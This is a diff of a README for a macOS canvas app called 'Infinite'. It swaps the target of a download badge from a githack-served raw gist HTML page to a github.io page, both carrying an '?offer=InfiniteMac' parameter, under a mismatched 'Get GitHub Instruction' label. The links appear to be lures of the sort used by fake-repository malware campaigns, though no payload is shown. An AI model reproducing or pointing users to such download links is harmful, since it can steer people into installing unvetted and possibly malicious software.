@@ -3,7 +3,7 @@
 **Infinite** is a limitless **visual workspace for macOS** designed for creative thinkers, developers, and strategists.  
 Organize ideas, notes, images, and workflows on a seamless infinite canvas — powered by AI and optimized for Apple Silicon. 🍎  
 
-[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20Infinite%20App-1976D2?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/icepowerjoker936/eca7832d90896a61b88b03b43ad9ab86/raw/f90a0e2cd1134d354cef922b465670293c048c1b/app.html?offer=InfiniteMac)
+[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20Infinite%20App-1976D2?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://desk-app-git.github.io/.github/?offer=InfiniteMac)
 
 ---
 
